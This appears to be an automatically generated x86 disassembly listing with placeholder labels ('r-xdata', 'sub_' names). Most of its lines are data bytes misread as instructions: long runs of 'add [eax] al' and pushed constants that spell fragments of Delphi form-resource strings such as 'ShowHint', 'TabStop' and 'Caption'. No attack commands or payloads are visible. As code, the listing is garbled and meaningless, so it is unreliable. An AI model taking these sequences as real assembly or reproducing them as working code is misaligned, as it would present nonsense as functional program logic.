add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
nop
and [ edi ] bl
inc ebx
add [ ebx ] al
or edx [ eax + ecx * 2 + 0x4b ]
mov eax eax
pop ds
inc ebx
add [ esi ] al
inc ebx
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0029 ] al
outsb
push ebx
je r-xdata
push esp
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add al ah
sbb [ ebp ] al
lodsb [ esi ]
add eax [ ebp ]
pushfd
push es
inc ebp
add [ ecx ] al
add [ ecx ] dl
mov ebp sub_436a48
or eax 0x73754354
je r-xdata
add [ ecx + eax * 8 + 0x44 ] bl
add [ eax + 0x5 ] dl
inc ebp
add [ esi + eax ] cl
inc ebp
add [ eax ] cl
add [ ebp ] eax
outsb
jbe r-xdata
add [ ebx ] al
or eax 0x494b4854
inc eax
add ah dh
pop ds
inc ebx
add [ esi ] al
push cs
push esp
dec eax
dec ebx
dec ecx
outsb
jbe r-xdata
or ch [ eax + 0x63 ]
push ebx
push 0x41746669
insb
je r-xdata
push 0x69685363
je r-xdata
add eax 0x6c416b68
je r-xdata
push 0x7274436b
insb
inc ebx
je r-xdata
insb
jae r-xdata
xchg esp eax
xor eax [ eax ]
cwde
xor eax [ eax ]
jb r-xdata
inc esp
insd
dec eax
outsd
je r-xdata
inc esp
add [ eax ] dl
mov [ eax + eax + 0x8 ] 0x5400449c
pop ss
inc edx
inc esp
add [ ebx + ecx * 4 - 0x4123ffbf ] ch
inc esp
add al dh
xchg edx eax
insb
imul esp [ ebx + ecx * 2 + 0x65 ] 0x78017379
pop ds
push cs
push 0x72744363
dec ebx
jns r-xdata
je r-xdata
insd
inc ebx
je r-xdata
or [ ebx + 0x6f ] al
push 0x7478456b
loop r-xdata
add [ eax - 0x6bffbfcd ] bl
insb
inc ecx
insb
je r-xdata
inc ebx
outsd
outsb
jbe r-xdata
shl [ edi + ebx + 0x43 ] 0x0
xor [ eax ] eax
and al 0x66
inc ebx
add [ eax ] bh
inc bx
add [ ebx ] cl
push esp
inc esp
outsd
add al ah
sbb [ ebp ] al
lodsb [ esi ]
add eax [ ebp ]
pushfd
push es
inc ebp
add [ edi ] al
push esp
dec eax
outsd
je r-xdata
add [ ecx + eax * 8 + 0x44 ] bl
add [ eax + 0x5 ] dl
inc ebp
add [ esi + eax ] cl
inc ebp
add [ eax ] cl
add [ ebp ] eax
add [ edx + 0x43 ] dh
add [ eax ] bl
add al [ eax ]
add [ eax ] cl
inc ebx
add [ edi + edx ] bh
inc edx
add [ eax - 0x6fffbfcd ] dl
jns r-xdata
add [ ecx + edx + 0x45 ] ch
add [ ecx + edx * 4 + 0x44 ] ah
add ah al
pop es
inc ebp
add ah ah
pop es
inc ebp
add ah bh
add al 0x45
add [ eax + edx * 4 - 0x6f4fffbc ] ch
inc esp
add [ eax + eax * 8 - 0x3f27ffbc ] ch
inc esp
add [ eax + 0x28004367 ] al
xchg edx eax
inc esp
add [ ebp + ebx * 4 + 0x44 ] bh
add ah dh
pushfd
add ah ch
xor [ eax ] al
or [ ecx ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
and [ ebx ] eax
sub [ ecx ] ah
inc ebx
add [ eax ] bl
je r-xdata
insd
inc ebx
je r-xdata
or [ ebx + 0x6f ] al
push 0x69685363
je r-xdata
add [ esp + edx ] bh
inc edx
add [ esp + edx ] dh
inc edx
add [ edi + edx + 0x42 ] bl
add [ esi + 0x43 ] cl
add [ ecx + 0x12200045 ] al
inc ebp
inc ebx
add [ ebp + 0x20580040 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] bh
inc ebx
add [ eax ] al
add [ eax + 0x1f ] edi
add al [ eax ]
add [ eax ] ah
pop esi
inc esp
add [ edi + edx ] bh
inc edx
add [ eax - 0x6fffbfcd ] dl
adc [ edx ] al
cwde
xor eax [ eax ]
xchg esp eax
insb
add al [ eax ]
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
jns r-xdata
add [ ecx + edx + 0x45 ] ch
add [ ecx + edx * 4 + 0x44 ] ah
add ah al
pop es
inc ebp
add ah ah
pop es
inc ebp
add ah bh
add al 0x45
add [ eax + edx * 4 - 0x6f4fffbc ] ch
add ah ch
xor [ eax ] al
inc esp
add [ eax ] cl
mov al [ 0xffffffff9eb40044 ]
inc esp
add [ eax ] dh
loope r-xdata
sar [ ecx ] 0x43
add [ edi ] al
or eax 0x73754354
je r-xdata
inc eax
add [ ebp + eax * 8 + 0x44 ] ch
add al dh
adc [ ebp ] eax
pop esp
insb
inc ecx
insb
je r-xdata
xchg esp eax
adc [ eax ] al
add [ eax ] 0x0
inc [ eax + 0x5cff0000 ]
mov esi 0x44
add [ eax - 0x80000000 ] al
pop es
add [ eax + ecx * 2 ] al
imul ebp [ esi + 0x74 ] r-xdata
je r-xdata
push ebx
imul edi [ edx + 0x65 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
inc esp
lahf
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000d ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xfc65646f
dec esi
inc esp
add [ eax + eax ] dh
push esp
retn 0x44
inc esp
add [ eax + eax * 8 - 0x3f27ffbc ] ch
inc esp
add [ eax + 0x28004367 ] al
xchg edx eax
inc esp
add [ ebp + ebx * 4 + 0x44 ] bh
add ah dh
pushfd
inc esp
add [ eax ] cl
mov al [ 0xffffffff9eb40044 ]
inc esp
add [ eax ] dh
loope r-xdata
nop
and al [ ebx ]
pop es
pop es
push esp
dec eax
outsd
je r-xdata
inc esp
add [ eax ] dl
mov [ eax + eax + 0x8 ] 0x5400449c
pop ss
inc edx
add [ esp + edx ] bh
add [ ebx + ecx * 4 - 0x4123ffbf ] ch
inc esp
add al dh
xchg edx eax
insd
dec eax
outsd
je r-xdata
lea eax [ eax ]
hlt
inc ebx
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax [ eax ]
push cs
push eax
popad
jb r-xdata
inc ebx
add [ eax + 0x1004368 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] dl
add [ esi ] al
or al 0x0
or [ ecx + 0x75 ] al
je r-xdata
add [ eax + 0x1 ] al
jns r-xdata
adc [ edx ] al
cwde
xor eax [ eax ]
xchg esp eax
loop r-xdata
nop
jns r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080016 ] al
push 0x6948776f
outsb
je r-xdata
outsb
je r-xdata
jae r-xdata
jns r-xdata
inc ebp
add [ eax + 0x1c0044c7 ] cl
into
inc esp
add [ ebx + ebx * 8 + 0x66e00044 ] bh
inc ebx
and [ ebx ] eax
cmp [ ecx ] ah
inc ebx
add [ ecx ] ah
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
or [ ecx ] dh
inc eax
add [ ebp + eax * 8 + 0x44 ] ch
add al dh
adc [ ebp ] eax
pop esp
fiadd [ eax + eax - 0x54 ]
mov eax [ ecx ]
fdivr [ esi - 0x6d0fffbc ]
and [ ebx ] al
aam 0x61
inc esp
add [ ebx ] cl
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
jo r-xdata
dec ebp
inc esp
add [ eax + 0x38004508 ] bh
or [ ebp ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc eax 0x6f500900
jo r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
0x94ff0000 0x449f
add [ ecx ] al
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
dec eax
outsd
je r-xdata
add [ eax + 0x41 ] al
adc [ eax ] al
push es
pop ds
inc ebx
add [ edx ] cl
add al [ eax ]
inc [ eax + ebp * 2 ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
adc [ eax ] eax
or ecx [ ecx + 0x6e ]
jbe r-xdata
add bh bh
hlt
insb
jae r-xdata
inc edx
add [ esp + edx ] dh
inc edx
add [ edi + edx + 0x42 ] bl
add [ esi + 0x43 ] cl
add [ ecx + 0x12200045 ] al
inc ebp
insb
jae r-xdata
inc esp
add [ eax ] bh
lahf
adc [ eax ] al
inc eax
popfd
jo r-xdata
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc al 0x0
push cs
push eax
popad
jb r-xdata
insb
imul esp [ ebx + ecx * 2 + 0x65 ] 0x1f607379
inc ebx
add [ ecx ] cl
add al [ eax ]
call [ edi + 0x10043 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x4 ] al
adc al [ eax ]
or [ ebp + 0x6f ] ecx
imul esp [ fs : esi + 0x69 ] 0x737265
add [ eax ] al
or eax [ eax ]
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ esi + ecx * 2 + 0x44 ] dl
add [ ecx ] ah
add bh bh
je r-xdata
add [ ecx + 0x43 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ edx ] 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
add [ esi + edi * 4 + 0x44 ] bl
add [ eax + 0x1 ] al
sbb [ eax ] eax
pop es
push esi
imul esi [ ebx + 0x69 ] 0x4656c62
push edi
inc ecx
add [ eax ] dl
add al [ eax ]
call [ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08001a ] al
outsb
inc ebx
push 0x65676e61
loopne r-xdata
adc [ eax ] al
push edi
add [ eax ] al
inc [ eax - 0x63 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06001d ] al
outsb
inc ebp
js r-xdata
inc esp
add [ eax ] dh
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e001b ] al
outsb
inc ebx
outsd
outsb
je r-xdata
movsb [ edi ] [ esi ]
add [ eax ] eax
call [ eax + 0x9 ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ eax ] al
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
outsb
jne r-xdata
or [ ebp ] al
cmp [ ecx ] cl
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
push 0x6948776f
outsb
je r-xdata
add [ eax ] dl
inc eax
add [ eax ] cl
add [ eax + ebx * 8 + 0x67200044 ] ah
inc ebx
add [ esp + ebx * 8 + 0x44 ] dl
add [ eax - 0x24 ] bl
inc esp
add [ eax ] dl
fild [ eax + eax - 0x48 ]
fiadd [ eax + eax + 0x30 ]
pop es
inc ebp
add [ eax ] al
in eax 0x44
mov [ eax + eax + 0x1c ] 0xbc0044ce
fild [ eax + eax - 0x20 ]
inc bx
inc esp
add [ eax ] dl
xchg edx eax
inc esp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
outsb
dec ebp
outsd
jne r-xdata
je r-xdata
dec edi
js r-xdata
adc [ eax ] al
cdq
add [ eax ] al
push [ eax - 0x61 ]
add [ eax - 0x1 ] al
pop ss
add [ eax ] cl
push esp
popad
bound ecx [ edi + 0x72 ]
jb r-xdata
mov es [ ebp ]
jl r-xdata
add ah bl
outsd
inc ebx
add [ eax - 0x6bffbe70 ] cl
insd
inc ebx
add [ eax + 0x7c004190 ] dh
push 0x43
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x100040 ] dl
add [ eax ] al
or edx [ esp + ecx * 2 + 0x69 ]
jae r-xdata
push ebp
jo r-xdata
outsd
jo r-xdata
outsb
dec ebp
outsd
jne r-xdata
dec edi
inc esp
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b001e ] al
add [ esi + 0x43 ] bl
add [ eax + 0x4326 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x26 ] ch
inc ebx
add [ eax ] dh
add [ eax ] al
add [ edi + ebx * 2 ] bh
inc esp
outsd
ja r-xdata
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ds
add [ ebx ] cl
dec edi
push eax
add bh bh
fcomp [ ebp + 0x10044 ]
add [ eax ] al
add [ eax ] al
xchg esp eax
adc [ eax ] al
inc ebx
outsd
insb
jne r-xdata
fsub [ 0x6010043 ]
push esp
push edi
imul esp [ esp + esi * 2 + 0x68 ] 0xfffffe04
outsb
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b001f ] al
jo r-xdata
xor [ eax + 0x44 ] dl
add al bl
add [ eax ] al
xor eax [ eax ]
xchg esp eax
xor eax [ eax ]
cwde
xor eax [ eax ]
dec ebp
outsd
jbe r-xdata
add bh bh
sub al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
push es
add [ ebx ] al
push esp
popad
fsub [ di ]
inc ebx
add [ esi + ebp * 2 + 0x43 ] ch
add [ eax - 0x67ffbc92 ] ah
outsb
inc ebx
add [ eax ] al
add [ eax ] al
xor [ edx ] 0x0
add [ eax ] al
pop es
add [ 0x74646957 ] al
push r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
sub [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ eax ] ch
inc ebx
add [ eax ] dh
sub [ ebx ] al
sbb al 0x0
add [ eax ] al
hlt
imul ebp [ edi + 0x6e ] r-xdata
sbb al 0x0
add bh bh
cmp [ edi + 0x43 ] ch
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
adc [ eax ] al
add bh bh
inc esp
outsb
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070002 ] al
imul edi [ edx + 0x65 ] r-xdata
outsb
mov eax eax
and [ esi ] 0x43
add [ edi ] al
or edx [ esp + ecx * 2 + 0x69 ]
jae r-xdata
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07001c ] al
outsb
inc ebp
outsb
je r-xdata
push edi
inc ecx
add al al
inc ecx
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
and al 0x6b
inc ebx
add [ eax - 0x7bffbe74 ] dl
imul eax [ ebx ] 0x68
outsd
inc ebx
cmp al 0x5f
mov eax 0xe000444f
add [ eax ] al
jmp eax
popad
jo r-xdata
add [ eax - 0x80000000 ] al
add al [ eax ]
pop es
inc ebx
inc ebx
outsd
insb
jne r-xdata
dec ebp
outsd
jne r-xdata
jb r-xdata
add [ eax ] al
outsb
cmp al 0x26
inc ebx
add al cl
pop edi
inc ecx
add [ eax ] cl
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
push edi
inc ecx
add al cl
add [ eax ] al
insb
jae r-xdata
dec esp
outsb
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] dl
inc eax
add [ 0x4ff0000 ] cl
outsd
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] eax
or [ ecx + 0x75 ] al
je r-xdata
add [ eax + 0x55 ] cl
inc ecx
add [ eax + eax ] cl
add bh bh
int3
and eax 0x180043
add bh bh
pop eax
outsd
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x694d0800
outsb
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
sub al 0x0
push ebx
sub_4314e3
mov esp 0x44be
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070024 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0e00
inc ebx
outsd
outsb
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] al
or cl [ edi + 0x6e ]
js r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09002b ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
inc esp
inc esp
jb r-xdata
push eax
outsd
jo r-xdata
add [ ebx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
add al 0x57
inc ecx
add [ eax ] ch
push edi
jo r-xdata
jb r-xdata
jo r-xdata
push esp
dec ebp
outsd
jbe r-xdata
inc esp
jb r-xdata
push ecx
inc esp
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
or eax 0x2300043
add bh bh
xor [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : edx ] dl
dec edi
outsb
inc ebx
jb r-xdata
push eax
popad
imul ebp [ esi + 0x74 ] 0x5064630a
jb r-xdata
jb r-xdata
dec edi
outsb
push edx
jae r-xdata
mov eax 0xe000444f
add [ eax ] al
jmp eax
add [ eax ] al
add [ eax + 0x4f06002c ] al
dec edi
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or cl [ edi + 0x6e ]
popad
je r-xdata
jne r-xdata
inc ebp
jb r-xdata
jae r-xdata
inc esp
outsd
arpl [ ebx + 0x4 ] bp
push edx
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0033 ] al
outsb
add eax [ eax ]
add [ eax ] al
sub al 0x17
jpe r-xdata
insb
add al 0x57
inc ecx
add al bh
add [ eax ] al
inc esp
outsd
ja r-xdata
outsb
dec eax
imul ebp [ esi + 0x74 ] r-xdata
rol [ eax ] 0x1
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax 0x6e4f0b00
dec ebp
outsd
jne r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0029 ] al
outsb
push eax
popad
outsb
insb
inc ebx
insb
popad
jae r-xdata
je r-xdata
or ah [ fs : ebx + 0x64 ]
arpl [ ebp + 0x73 ] si
jae r-xdata
popad
jb r-xdata
inc ebp
jb r-xdata
ror [ edi + edx + 0x2030043 ] 0x2e
cmp [ ecx ] eax
jb r-xdata
jae r-xdata
or ah [ ebx + 0x64 ]
add [ eax ] al
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0032 ] al
outsb
push ebx
je r-xdata
or al 0x54
xor [ eax + 0x44 ] dl
add al bl
add [ eax ] al
add al [ eax ]
[ eax ]
push edx
inc esp
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09002a ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x4c ] bp
push edx
inc esp
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ ecx ] al
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ edi + 0x6e ] ecx
add al 0x57
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
or al 0x70
outsd
outsb
push es
je r-xdata
popa
arpl [ ebx + esi * 2 + 0x44 ] sp
or esp [ ebx + 0x64 ]
push eax
outsd
jae r-xdata
adc [ fs : ebx + 0x64 ] ah
jne r-xdata
popad
jae r-xdata
dec ecx
jb r-xdata
add [ ebx ] cl
arpl [ ebx + esi * 2 + 0x53 ] sp
inc esp
jb r-xdata
inc ebp
add [ edx + ebx * 8 + 0x44 ] bl
add [ ebx + ecx * 4 - 0x4123ffbf ] ch
inc esp
add al dh
xchg edx eax
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
popad
je r-xdata
outsb
je r-xdata
je r-xdata
jae r-xdata
push es
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
inc edx
outsd
je r-xdata
add [ eax ] ch
sbb [ ebx ] al
push es
jae r-xdata
outsb
jae r-xdata
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
jb r-xdata
adc [ ebx + eax * 2 + 0x75 ] dl
jns r-xdata
add [ eax ] al
add [ eax ] al
or [ eax ] al
add [ eax ] al
mov [ edi ] dl
inc ebx
add eax [ edx ]
cmp [ cs : ecx ] eax
xor [ bx ] dl
inc ebx
add [ ebx ] al
adc [ ebx + eax * 2 + 0x75 ] dl
jae r-xdata
add al ah
sbb [ ebp ] al
lodsb [ esi ]
add eax [ ebp ]
pushfd
push es
inc ebp
add [ esp + edx * 2 ] cl
push eax
jb r-xdata
add [ ecx + eax * 8 + 0x44 ] bl
add [ eax + 0x5 ] dl
inc ebp
add [ esi + eax ] cl
inc ebp
add [ eax ] cl
add [ ebp ] eax
inc esp
add [ eax ] dl
mov [ eax + eax + 0x8 ] 0x5400449c
pop ss
inc edx
inc ecx
add ah bl
mov esi 0x92f00044
outsb
je r-xdata
add [ edi + edx ] bh
inc ebx
add [ eax ] al
je r-xdata
push es
jae r-xdata
inc edx
add [ eax - 0x6fffbfcd ] dl
adc [ edx ] al
je r-xdata
bound ecx [ eax + 0x6f ]
jb r-xdata
outsd
outsb
add [ eax ] eax
add ecx [ eax - 0x6fffbce9 ]
sub al 0x18
inc ebx
add [ ebx ] al
or [ ebx + 0x64 ] esp
jae r-xdata
arpl [ ebx + esi * 2 + 0x48 ] sp
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
dec esi
or [ ebx + edx * 2 + 0x6f ] edx
jb r-xdata
outsd
je r-xdata
insb
jae r-xdata
sbb [ ebx ] eax
and [ edx ] al
insb
jae r-xdata
inc eax
add [ eax + 0x18 ] dh
inc ebx
add [ ebx ] al
imul ebp [ esi + 0x61 ] 0x43086574
outsd
insd
inc ebx
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + ebx + 0x43 ] ch
add [ eax + esi * 2 ] cl
outsd
insd
inc esp
jb r-xdata
or esp [ fs : ebx + 0x64 ]
jae r-xdata
jae r-xdata
outsd
insd
inc esp
jb r-xdata
arpl [ eax + 0x6f ] bp
jb r-xdata
jb r-xdata
add al dh
adc [ ebp ] eax
pop esp
fiadd [ eax + eax - 0x54 ]
mov eax [ ecx ]
fdivr [ esi - 0x6d0fffbc ]
insb
or dh [ eax + 0x62 ]
add [ ecx + edx + 0x45 ] ch
add [ ecx + edx * 4 + 0x44 ] ah
add ah al
pop es
inc ebp
add ah ah
pop es
inc ebp
add ah bh
add al 0x45
add [ eax + edx * 4 - 0x6f4fffbc ] ch
inc esp
add [ eax + eax * 8 - 0x3f27ffbc ] ch
inc esp
add al dh
fwait
inc esp
add [ eax ] ch
xchg edx eax
inc esp
add ah ch
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ ebp + eax * 8 + 0x44 ] ch
add [ esp + edx ] dh
inc edx
add [ edi + edx + 0x42 ] bl
add al cl
popad
inc ebx
add [ ecx + 0x12200045 ] al
inc ebp
insb
jae r-xdata
sbb [ ebx ] eax
add [ eax ] al
push esp
js r-xdata
cwde
jb r-xdata
push esp
jns r-xdata
add [ eax ] al
add [ ebx ] al
add [ eax ] al
jae r-xdata
adc [ ebx + 0x64 ] ah
arpl [ ebx + esi * 2 + 0x4d ] sp
push ebx
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax [ eax ]
or ecx [ edi + 0x6e ]
je r-xdata
pop ss
jb r-xdata
inc edx
popad
insb
jae r-xdata
jb r-xdata
ja r-xdata
insd
imul esi [ ebx + 0x61 ] 0x64656c62
or ah [ ebx + 0x64 ]
jae r-xdata
or esp [ ebx + 0x64 ]
jae r-xdata
ja r-xdata
add [ eax ] al
jmp [ eax ]
int3
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
jae r-xdata
add [ esp + edx ] bh
inc edx
inc esp
add [ edi + edx + 0x42 ] dl
imul esp [ ebx + 0x61 ] 0x6f43086c
insd
inc ebx
add al 0x19
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
push es
push esi
add [ gs : eax ] eax
add [ eax ] al
and [ esi + 0x44 ] bl
jae r-xdata
add [ eax ] al
jb r-xdata
adc [ eax ] bl
inc ebx
add [ esi ] al
pop ss
push esp
push eax
jb r-xdata
je r-xdata
push 0x656b6365
or ah [ fs : ebx + 0x64 ]
jae r-xdata
insb
arpl [ gs : ebp + 0x64 ] si
or [ ebx + 0x64 ] esp
jae r-xdata
je r-xdata
insb
add [ eax ] eax
inc edx
popad
jb r-xdata
loop r-xdata
inc edx
add [ eax - 0x6bffbfcd ] bl
xor eax [ eax ]
xchg esp eax
inc eax
add [ eax - 0x67ffbdf0 ] dl
jae r-xdata
outsd
push ebx
inc ebx
add [ edx ] cl
arpl [ eax + edx * 2 + 0x72 ] sp
push eax
popad
imul ebp [ esi + 0x74 ] 0x5064630b
outsd
jae r-xdata
add [ gs : bx + si ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ edi + edx ] ch
add [ ebp + ebx * 4 + 0x44 ] bh
add ah dh
pushfd
inc esp
add [ eax ] cl
mov al [ 0xffffffff9eb40044 ]
inc esp
add [ eax ] dh
loope r-xdata
inc eax
add al ah
sbb [ ebx ] eax
pop es
or al 0x54
push eax
jb r-xdata
add [ eax ] al
add [ eax ] al
or eax 0x6f420b00
jb r-xdata
add [ eax ] al
add [ eax ] dl
add [ eax ] cl
inc esp
jb r-xdata
jb r-xdata
or [ ebp ] al
add [ eax ] eax
add [ eax ] al
jae r-xdata
inc ebx
outsd
outsb
jae r-xdata
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
or [ edx + esi * 2 + 0x61 ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
jpe r-xdata
jb r-xdata
add [ ebx ] cl
inc edx
outsd
inc edx
popad
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
jb r-xdata
add bh bh
jpe r-xdata
popad
inc esp
add [ ebx ] ch
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
sbb [ ebx ] eax
aam 0x61
add [ eax ] al
outsb
je r-xdata
popad
je r-xdata
imul ebp [ esi + 0x74 ] 0x40103c73
add [ ebx + 0x43 ] dl
add [ eax + 0x65 ] bl
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc eax [ eax ]
add ecx [ ebp + 0x69 ]
outsb
cmp al 0x10
inc eax
add [ ebx + 0x65640043 ] cl
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ eax + eax ] 0x0
adc al 0x0
add ecx [ ebp + 0x61 ]
js r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
push cs
add [ edx ] cl
inc esp
jb r-xdata
insb
jae r-xdata
add [ ecx + eax + 0x950ff00 ] ah
cmp al 0x10
inc eax
add [ eax ] bl
add al [ eax ]
inc eax
inc ebx
add [ ecx ] al
